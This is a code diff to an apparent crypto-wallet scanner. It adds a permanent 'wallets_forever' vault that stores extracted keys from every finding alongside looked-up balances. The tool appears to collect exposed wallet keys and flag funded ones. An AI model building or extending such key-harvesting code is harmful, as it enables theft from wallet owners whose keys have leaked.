@@ -156,6 +156,7 @@ def check_network_access() -> dict:
         old_age_sec — float: seconds since last confirmed probe (0 if never)
         old_stale   — bool: old_ok is False AND we have a recorded probe
     """
+    global _NET_LAST_OK
     now = time.time()
     result: dict = {
         "new_ok": False,
@@ -273,6 +274,7 @@ STATUS_FILE = os.path.join(APP_DIR, "crypto_scanner_status.txt")
 BALANCE_CACHE_FILE = os.path.join(APP_DIR, "balance_cache.jsonl")
 HIGH_CONFIDENCE_FILE = os.path.join(APP_DIR, "high_confidence_hits.jsonl")
 BALANCE_HIT_FILE = os.path.join(APP_DIR, "balances_hit.jsonl")
+WALLETS_FOREVER_JSONL = os.path.join(APP_DIR, "wallets_forever.jsonl")
 
 # ---------------------------------------------------------------------------
 # Disk space safety
@@ -1514,6 +1516,13 @@ def get_balance(chain: str, address: str, force: bool = False) -> Dict[str, Any]
     except Exception:
         pass
 
+    # Mirror balances onto permanent key vault when address is known
+    try:
+        if isinstance(balance, (int, float)):
+            _forever_update_balance(chain, address, balance)
+    except Exception:
+        pass
+
     return rec
 
 
@@ -1556,6 +1565,26 @@ def try_decode_base64(token: str) -> List[str]:
 # ---------------------------------------------------------------------------
 # Correlation
 # ---------------------------------------------------------------------------
+
+def _forever_ingest_record(record: Dict[str, Any]) -> None:
+    """Best-effort upsert into permanent wallets_forever store (keys only)."""
+    try:
+        import wallets_forever as _wf
+        _wf.upsert_from_record(record)
+    except Exception as exc:
+        logger.debug("wallets_forever ingest skipped: %s", exc)
+
+
+def _forever_update_balance(chain: str, address: str, balance) -> None:
+    try:
+        if balance is None:
+            return
+        import wallets_forever as _wf
+        _wf.update_balance(chain, address, float(balance))
+    except Exception as exc:
+        logger.debug("wallets_forever balance update skipped: %s", exc)
+
+
 def correlate_findings(findings: Dict[str, Any], source_line: str, context_window: List[str]) -> Dict[str, Any]:
     """Derive addresses + score confidence. Uses crypto_iq when available."""
     if _crypto_iq is not None:
@@ -2009,6 +2038,7 @@ def main():
     logger.info("Memory: %s", MEMORY_FILE)
     logger.info("Balance cache: %s", BALANCE_CACHE_FILE)
     logger.info("High-confidence hits: %s", HIGH_CONFIDENCE_FILE)
+    logger.info("Wallets forever: %s", WALLETS_FOREVER_JSONL)
     if _crypto_iq is not None:
         try:
             info = _crypto_iq.backend_info()
@@ -2199,6 +2229,7 @@ def main():
                 }
                 with open(MEMORY_FILE, "a") as f:
                     f.write(json.dumps(record) + "\n")
+                _forever_ingest_record(record)
 
                 logger.info(
                     "Findings #%d at %s source=%s",
